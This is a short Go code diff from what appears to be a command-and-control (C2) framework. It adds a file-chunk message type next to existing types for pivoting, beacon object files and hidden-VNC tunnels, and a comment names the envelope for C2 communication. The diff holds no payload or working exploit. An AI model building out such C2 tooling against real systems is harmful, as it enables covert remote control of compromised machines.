@@ -32,6 +32,7 @@ const (
 	MsgPivot        MessageType = 14
 	MsgBOF          MessageType = 15
 	MsgTunnel       MessageType = 16 // frames de túnel persistente (hVNC/WS)
+	MsgFileChunk    MessageType = 17
 )
 
 // Envelope es el wrapper genérico para toda comunicación C2.
